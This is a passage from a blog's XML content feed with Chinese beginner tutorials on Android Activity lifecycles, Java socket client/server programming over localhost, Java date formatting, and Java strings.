class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这里定义了一个应用程序名的字符串，可以有两种方法来引用它。</p><p>在java代码中通过R.string.app_name/在XML中通过@string/app_name可以获得该字符串的引用</p><h3 id="7-Android-Activity组件及其生命周期"><a href="#7-Android-Activity组件及其生命周期" class="headerlink" title="7.Android Activity组件及其生命周期"></a>7.Android Activity组件及其生命周期</h3><p>Activity 是 <a href="http://c.biancheng.net/android/">Android</a> 组件中最基本也是最为常见的组件。</p><p>Activity 是用户接口程序，原则上它会提供给用户一个交互式的接口功能，几乎所有的 Activity 都要和用户打交道，也有人把它比喻成 Android 的管理员。需要在屏幕上显示什么、用户在屏幕上做什么、处理用户的不同操作等都由 Activity 来管理和调度。</p><p>Activity 提供用户与 Android 系统交互的接口，用户通过 Activity 来完成自己的目的。例如打电话、拍照、发送 E-mail、查看地图等。</p><p>每个 Activity 都提供一个用户界面窗口，一般情况下，该界面窗口会填满整个屏幕，但是也可以比屏幕小，或者浮在其他的窗口之上。</p><p>一个 Android 应用程序通常由多个 Activity 组成，但是其中只有一个为主 Activity。其作用相当于 <a href="http://c.biancheng.net/java/">Java</a> 应用程序中的 main 函数，当应用程序启动时，作为应用程序的入口首先呈现给用户。</p><p>Android 应用程序中的多个 Activity 可以直接相互调用以完成不同工作。</p><p>当新的 Activity 被启动的时候，之前的 Activity 会停止，但是不会被销毁，而是被压入“后退栈(Back Stack)”的栈顶，新启动的 Activity 获得焦点，显示给用户。</p><p>“后退栈”遵循“后入先出”的原则。当新启动的 Activity 被使用完毕，用户单击“Back”按钮时，当前的 Activity 会被销毁，而原先的 Activity 会被从“后退栈”的栈顶弹出并且激活。</p><p>当 Activity 状态发生改变时，都会通过状态回调函数通知 Android 系统。而程序编写人员可以通过这些回调函数对 Activity 进行进一步的控制。</p><h4 id="Activity-的生命周期"><a href="#Activity-的生命周期" class="headerlink" title="Activity 的生命周期"></a>Activity 的生命周期</h4><p>从本质上讲，Activity 在生命周期中共存在三个状态，这三个状态如下：</p><h4 id="1-运行态"><a href="#1-运行态" class="headerlink" title="1) 运行态"></a>1) 运行态</h4><p>指 Activity 运行于屏幕的最上层并且获得了用户焦点。</p><h4 id="2-暂停态"><a href="#2-暂停态" class="headerlink" title="2) 暂停态"></a>2) 暂停态</h4><p>指当前 Activity 依然存在，但是没有获得用户焦点。</p><p>在其之上有其他的 Activity 处于运行态，但是由于处于运行态的 Activity 没有遮挡住整个屏幕，当前 Activity 有一部分视图可以被用户看见。处于暂停态的 Activity 保留了自己所使用的内存和用户信息，但是在系统极度缺乏资源的情况下，有可能会被杀死以释放资源。</p><h4 id="3-停止态"><a href="#3-停止态" class="headerlink" title="3) 停止态"></a>3) 停止态</h4><p>指当前 Activity 完全被处于运行态的 Activity 遮挡住，其用户界面完全不能被用户看见。</p><p>处于停止态的 Activity 依然存活，也保留了自己所使用的内存和用户信息，但是一旦系统缺乏资源，停止态的 Activity 就会被杀死以释放资源。</p><p>Activity 在生命周期中从一种状态到另一种状态时会激发相应的回调方法，这几个回调方法如下：</p><table><thead><tr><th>名称</th><th>调用时间</th></tr></thead><tbody><tr><td>onCreate(Bundle savedInstanceState)</td><td>创建 Activity 时调用。  设置在该方法中，还以 Bundle 的形式提供对以前储存的任何状态的访问。其中参数 savedInstanceState 对象是用于保存 Activity 的对象的状态。</td></tr><tr><td>onStart()</td><td>Activity 变为在屏幕上对用户可见时调用。</td></tr><tr><td>onResume()</td><td>Activity 开始与用户交互时调用（无论是启动还是重启一个活动，该方法总是被调用）。</td></tr><tr><td>onPause()</td><td>当 Android 系统要激活其他 Activity 时，该方法被调用，暂停或收回 CPU 和其他资源时调用。</td></tr><tr><td>onStop()</td><td>Activity 被停止并转为不可见阶段时调用。</td></tr><tr><td>onRestart()</td><td>重新启动已经停止的 Activity 时调用。</td></tr><tr><td>onDestroy()</td><td>Activity 被完全从系统内存中移除时调用。  该方法被调用可能是因为有人直接调用 finish() 方法或者系统决定停止该活动以释放资源。</td></tr></tbody></table><p>上面 7 个生命周期方法分别在 4 个阶段按着一定的顺序进行调用，这 4 个阶段如下：</p><ul><li>启动 Activity：在这个阶段依次执行 3 个生命周期方法：onCreate、onStart 和 onResume。</li><li>Activity 失去焦点：如果在 Activity 获得焦点的情况下进入其他的 Activity 或应用程序，这时当前的 Activity 会失去焦点。在这一阶段，会依次执行 onPause 和 onStop 方法。</li><li>Activity 重获焦点：如果 Activity 重新获得焦点，会依次执行 3 个生命周期方法：onRestart、onStart 和 onResume。</li><li>关闭 Activity：当 Activity 被关闭时，系统会依次执行 3 个生命周期方法：onPause、onStop 和 onDestroy。</li></ul><p>Activity 生命周期中方法的调用过程如图所示，可以很直观地了解到 Activity 的整个生命周期。<img src="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920174238554.png" class="lazyload" data-srcset="/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/image-20200920174238554.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920174238554"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA网络编程</title>
      <link href="/2020/09/20/Java/JAVA%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/09/20/Java/JAVA%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-网络编程"><a href="#Java-网络编程" class="headerlink" title="Java 网络编程"></a>Java 网络编程</h1><p>网络编程是指编写运行在多个设备（计算机）的程序，这些设备都通过网络连接起来。</p><p>java.net 包中 J2SE 的 API 包含有类和接口，它们提供低层次的通信细节。你可以直接使用这些类和接口，来专注于解决问题，而不用关注通信细节。</p><p>java.net 包中提供了两种常见的网络协议的支持：</p><ul><li><strong>TCP</strong>：TCP 是传输控制协议的缩写，它保障了两个应用程序之间的可靠通信。通常用于互联网协议，被称 TCP / IP。</li><li><strong>UDP</strong>：UDP 是用户数据报协议的缩写，一个无连接的协议。提供了应用程序之间要发送的数据的数据包。</li></ul><p>本教程主要讲解以下两个主题。</p><ul><li><strong>Socket 编程</strong>：这是使用最广泛的网络概念，它已被解释地非常详细。</li></ul><h1 id="Socket-编程"><a href="#Socket-编程" class="headerlink" title="Socket 编程"></a>Socket 编程</h1><p>Socket使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个Socket，并尝试连接服务器的Socket。</p><p>当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。</p><p>java.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来<strong>监听</strong>客户端，并与他们建立连接的机制。</p><p>以下步骤在两台计算机之间使用套接字建立TCP连接时会出现：</p><ul><li>服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。</li><li>服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。</li><li>服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。</li><li>Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。</li><li>在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 Socket 连接到客户端的 Socket。</li></ul><p>连接建立后，通过使用 I/O 流在进行通信，每一个Socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。</p><p>TCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送.以下是一些类提供的一套完整的有用的方法来实现 Socket。</p><h1 id="ServerSocket-类的方法-服务器端的Socket"><a href="#ServerSocket-类的方法-服务器端的Socket" class="headerlink" title="ServerSocket 类的方法(服务器端的Socket)"></a>ServerSocket 类的方法(服务器端的Socket)</h1><p>服务器应用程序通过使用 java.net.ServerSocket 类以获取一个端口,并且侦听客户端请求。</p><p>ServerSocket 类有四个构造方法：</p><table><thead><tr><th><strong>序号</strong></th><th><strong>方法描述</strong></th></tr></thead><tbody><tr><td>1</td><td><strong>public ServerSocket(int port) throws IOException</strong> 创建绑定到特定端口的服务器套接字。</td></tr><tr><td>2</td><td><strong>public ServerSocket(int port, int backlog) throws IOException</strong> 利用指定的 backlog 创建服务器套接字并将其绑定到指定的本地端口号。</td></tr><tr><td>3</td><td><strong>public ServerSocket(int port, int backlog, InetAddress address) throws IOException</strong> 使用指定的端口、侦听 backlog 和要绑定到的本地 IP 地址创建服务器。</td></tr><tr><td>4</td><td><strong>public ServerSocket() throws IOException</strong> 创建非绑定服务器套接字。</td></tr></tbody></table><p>创建非绑定服务器套接字。 如果 ServerSocket 构造方法没有抛出异常，就意味着你的应用程序已经成功绑定到指定的端口，并且侦听客户端请求。</p><p>这里有一些 ServerSocket 类的常用方法：</p><table><thead><tr><th><strong>序号</strong></th><th><strong>方法描述</strong></th></tr></thead><tbody><tr><td>1</td><td><strong>public int getLocalPort()</strong>  返回此套接字在其上侦听的端口。</td></tr><tr><td>2</td><td><strong>public Socket accept() throws IOException</strong> 侦听并接受到此套接字的连接。</td></tr><tr><td>3</td><td><strong>public void setSoTimeout(int timeout)</strong>  通过指定超时值启用/禁用 SO_TIMEOUT，以毫秒为单位。</td></tr><tr><td>4</td><td><strong>public void bind(SocketAddress host, int backlog)</strong> 将 ServerSocket 绑定到特定地址（IP 地址和端口号）。</td></tr></tbody></table><h1 id="Socket-类的方法（客户端的Socket）"><a href="#Socket-类的方法（客户端的Socket）" class="headerlink" title="Socket 类的方法（客户端的Socket）"></a>Socket 类的方法（客户端的Socket）</h1><p>java.net.Socket 类代表客户端和服务器都用来互相沟通的套接字。客户端要获取一个 Socket 对象通过实例化 ，而 服务器获得一个 Socket 对象则通过 accept() 方法的返回值。</p><p>Socket 类有五个构造方法.</p><table><thead><tr><th><strong>序号</strong></th><th><strong>方法描述</strong></th></tr></thead><tbody><tr><td>1</td><td><strong>public Socket(String host, int port) throws UnknownHostException, IOException.</strong> 创建一个流套接字并将其连接到指定主机上的指定端口号。</td></tr><tr><td>2</td><td><strong>public Socket(InetAddress host, int port) throws IOException</strong> 创建一个流套接字并将其连接到指定 IP 地址的指定端口号。</td></tr><tr><td>3</td><td><strong>public Socket(String host, int port, InetAddress localAddress, int localPort) throws IOException.</strong> 创建一个套接字并将其连接到指定远程主机上的指定远程端口。</td></tr><tr><td>4</td><td><strong>public Socket(InetAddress host, int port, InetAddress localAddress, int localPort) throws IOException.</strong> 创建一个套接字并将其连接到指定远程地址上的指定远程端口。</td></tr><tr><td>5</td><td><strong>public Socket()</strong> 通过系统默认类型的 SocketImpl 创建未连接套接字</td></tr></tbody></table><h1 id="InetAddress-类的方法"><a href="#InetAddress-类的方法" class="headerlink" title="InetAddress 类的方法"></a>InetAddress 类的方法</h1><p>这个类表示互联网协议(IP)地址。下面列出了 Socket 编程时比较有用的方法：</p><table><thead><tr><th><strong>序号</strong></th><th><strong>方法描述</strong></th></tr></thead><tbody><tr><td>1</td><td><strong>static InetAddress getByAddress(byte[] addr)</strong> 在给定原始 IP 地址的情况下，返回 InetAddress 对象。</td></tr><tr><td>2</td><td><strong>static InetAddress getByAddress(String host, byte[] addr)</strong> 根据提供的主机名和 IP 地址创建 InetAddress。</td></tr><tr><td>3</td><td><strong>static InetAddress getByName(String host)</strong> 在给定主机名的情况下确定主机的 IP 地址。</td></tr><tr><td>4</td><td><strong>String getHostAddress()</strong>  返回 IP 地址字符串（以文本表现形式）。</td></tr><tr><td>5</td><td><strong>String getHostName()</strong>   获取此 IP 地址的主机名。</td></tr><tr><td>6</td><td><strong>static InetAddress getLocalHost()</strong> 返回本地主机。</td></tr><tr><td>7</td><td><strong>String toString()</strong> 将此 IP 地址转换为 String。</td></tr></tbody></table><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h1><p>客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> GreetingClient;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> <span class="comment">//客户端代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreetingClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="comment">//ip地址</span></span><br><span class="line">      String serverName = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">       <span class="comment">//端口</span></span><br><span class="line">      <span class="keyword">int</span> port = <span class="number">8888</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;连接到主机：&quot;</span> + serverName + <span class="string">&quot; ，端口号：&quot;</span> + port);</span><br><span class="line">         <span class="comment">//建立一个socket对象（ip以及端口号）</span></span><br><span class="line">         Socket client = <span class="keyword">new</span> Socket(serverName, port);</span><br><span class="line">         System.out.println(<span class="string">&quot;远程主机地址：&quot;</span> + client.getRemoteSocketAddress());</span><br><span class="line">         <span class="comment">//获得socket对象的输出流</span></span><br><span class="line">         OutputStream outToServer = client.getOutputStream();</span><br><span class="line">         DataOutputStream out = <span class="keyword">new</span> DataOutputStream(outToServer);</span><br><span class="line">         <span class="comment">//输出获取的输出流和本地的ip以及端口</span></span><br><span class="line">         out.writeUTF(<span class="string">&quot;Hello from &quot;</span> + client.getLocalSocketAddress());</span><br><span class="line">         <span class="comment">//获取socket对象的输入流</span></span><br><span class="line">         InputStream inFromServer = client.getInputStream();</span><br><span class="line">         DataInputStream in = <span class="keyword">new</span> DataInputStream(inFromServer);</span><br><span class="line">         </span><br><span class="line">         System.out.println(<span class="string">&quot;服务器响应： &quot;</span> + in.readUTF());</span><br><span class="line">         client.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)</span><br><span class="line">      &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> GreetingServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreetingServer</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> ServerSocket serverSocket;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">GreetingServer</span><span class="params">(<span class="keyword">int</span> port)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      serverSocket = <span class="keyword">new</span> ServerSocket(port);</span><br><span class="line">      serverSocket.setSoTimeout(<span class="number">10000</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">try</span></span><br><span class="line">         &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;等待远程连接，端口号为：&quot;</span> + serverSocket.getLocalPort() + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">            Socket server = serverSocket.accept();</span><br><span class="line">            System.out.println(<span class="string">&quot;远程主机地址：&quot;</span> + server.getRemoteSocketAddress());</span><br><span class="line">            System.out.println(<span class="string">&quot;xdm&quot;</span>);</span><br><span class="line">            DataInputStream in = <span class="keyword">new</span> DataInputStream(server.getInputStream());</span><br><span class="line">            System.out.println(in.readUTF());</span><br><span class="line">            DataOutputStream out = <span class="keyword">new</span> DataOutputStream(server.getOutputStream());</span><br><span class="line">            out.writeUTF(<span class="string">&quot;谢谢连接我：&quot;</span> + server.getLocalSocketAddress() + <span class="string">&quot;\nGoodbye!&quot;</span>);</span><br><span class="line">            server.close();</span><br><span class="line">         &#125;<span class="keyword">catch</span>(SocketTimeoutException s)</span><br><span class="line">         &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Socket timed out!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;<span class="keyword">catch</span>(IOException e)</span><br><span class="line">         &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> port =<span class="number">8888</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         Thread t = <span class="keyword">new</span> GreetingServer(port);</span><br><span class="line">         t.run();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)</span><br><span class="line">      &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA的日期时间</title>
      <link href="/2020/09/20/Java/JAVA%E7%9A%84%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/"/>
      <url>/2020/09/20/Java/JAVA%E7%9A%84%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="先导入java-util-Date的类"><a href="#先导入java-util-Date的类" class="headerlink" title="先导入java.util.Date的类"></a>先导入java.util.Date的类</h1><p>第一个构造函数使用当前日期和时间来初始化对象。</p><p>Date( )</p><p>第二个构造函数接收一个参数，该参数是从1970年1月1日起的毫秒数。</p><p>Date(long millisec)</p><p>Date对象创建以后，可以调用下面的方法。</p><table><thead><tr><th align="left">序号</th><th align="center">方法和描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="center"><strong>boolean after(Date date)</strong> 若当调用此方法的Date对象在指定日期之后返回true,否则返回false。</td></tr><tr><td align="left">2</td><td align="center"><strong>boolean before(Date date)</strong> 若当调用此方法的Date对象在指定日期之前返回true,否则返回false。</td></tr><tr><td align="left">3</td><td align="center"><strong>Object clone( )</strong> 返回此对象的副本。</td></tr><tr><td align="left">4</td><td align="center"><strong>int compareTo(Date date)</strong> 比较当调用此方法的Date对象和指定日期。两者相等时候返回0。调用对象在指定日期之前则返回负数。调用对象在指定日期之后则返回正数。</td></tr><tr><td align="left">5</td><td align="center"><strong>int compareTo(Object obj)</strong> 若obj是Date类型则操作等同于compareTo(Date) 。否则它抛出ClassCastException。</td></tr><tr><td align="left">6</td><td align="center"><strong>boolean equals(Object date)</strong> 当调用此方法的Date对象和指定日期相等时候返回true,否则返回false。</td></tr><tr><td align="left">7</td><td align="center"><strong>long getTime( )</strong> 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。</td></tr><tr><td align="left">8</td><td align="center"><strong>int hashCode( )</strong>  返回此对象的哈希码值。</td></tr><tr><td align="left">9</td><td align="center"><strong>void setTime(long time)</strong>   用自1970年1月1日00:00:00 GMT以后time毫秒数设置时间和日期。</td></tr><tr><td align="left">10</td><td align="center"><strong>String toString( )</strong> 把此 Date 对象转换为以下形式的 String： dow mon dd hh:mm:ss zzz yyyy 其中： dow 是一周中的某一天 (Sun, Mon, Tue, Wed, Thu, Fri, Sat)。</td></tr></tbody></table><h1 id="格式化时间"><a href="#格式化时间" class="headerlink" title="格式化时间"></a><strong>格式化时间</strong></h1><p>第一种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.text.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[] )</span></span>&#123;</span><br><span class="line">   <span class="comment">// 初始化 Date 对象</span></span><br><span class="line">       Date dNow = <span class="keyword">new</span> Date( );</span><br><span class="line">       <span class="comment">//先建立一个转化格式 这一行代码确立了转换的格式，其中 yyyy 是完整的公元年，MM    //是月份，dd 是日期，HH:mm:ss 是时、分、秒。</span></span><br><span class="line"></span><br><span class="line">注意:有的格式大写，有的格式小写，例如 MM 是月份，mm 是分；HH 是 <span class="number">24</span> 小时制，而 hh 是 <span class="number">12</span> 小时制。</span><br><span class="line">       SimpleDateFormat ft = <span class="keyword">new</span> SimpleDateFormat (<span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);</span><br><span class="line">    </span><br><span class="line">       System.out.print(ft.format(dNow)+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:<img src="/2020/09/20/Java/JAVA%E7%9A%84%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/image-20200920133104316.png" class="lazyload" data-srcset="/2020/09/20/Java/JAVA%E7%9A%84%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/image-20200920133104316.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920133104316"></p><p>第二种：使用printf格式化日期</p><p>printf 方法可以很轻松地格式化时间和日期。使用两个字母格式，它以 <strong>%t</strong> 开头并且以下面表格中的一个字母结尾。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DateDemo</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 初始化 Date 对象</span></span><br><span class="line">     Date date = <span class="keyword">new</span> Date();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//c的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;全部日期和时间信息：%tc%n&quot;</span>,date);          </span><br><span class="line">    <span class="comment">//f的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;年-月-日格式：%tF%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//d的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;月/日/年格式：%tD%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//r的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;HH:MM:SS PM格式（12时制）：%tr%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//t的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;HH:MM:SS格式（24时制）：%tT%n&quot;</span>,date);  </span><br><span class="line">    <span class="comment">//R的使用  </span></span><br><span class="line">    System.out.printf(<span class="string">&quot;HH:MM格式（24时制）：%tR&quot;</span>,date);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA的string</title>
      <link href="/2020/09/20/Java/JAVA%E7%9A%84string/"/>
      <url>/2020/09/20/Java/JAVA%E7%9A%84string/</url>
      
        <content type="html"><![CDATA[<h1 id="创建字符串"><a href="#创建字符串" class="headerlink" title="创建字符串"></a>创建字符串</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDemo</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      <span class="keyword">char</span>[] helloArray = &#123; <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&#125;;</span><br><span class="line">      String helloString = <span class="keyword">new</span> String(helloArray);  </span><br><span class="line">      System.out.println( helloString );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h1><p>String 类的一个访问器方法是 length() 方法，它返回字符串对象包含的字符数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String site = <span class="string">&quot;ccccc&quot;</span>;</span><br><span class="line">        <span 